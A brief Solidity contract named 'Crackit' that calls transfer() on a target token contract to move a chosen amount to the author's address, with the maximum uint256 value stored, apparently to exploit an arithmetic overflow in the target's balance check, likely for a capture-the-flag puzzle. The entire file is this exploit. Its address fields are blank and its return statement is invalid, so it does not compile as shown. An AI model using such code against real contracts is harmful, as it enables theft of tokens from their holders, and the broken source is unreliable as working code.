// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Exploit {
    function transfer(address _owner, uint _value) external;
}

contract Crackit {

      address targetAddr = ;
      address myAddress = ;
      uint myValue = 115792089237316195423570985008687907853269984665640564039457584007913129639935;

      function crackIt(uint _myValue) external {
      return Exploit(targetAddr).transfer(myAddress, _myValue);
    }

}
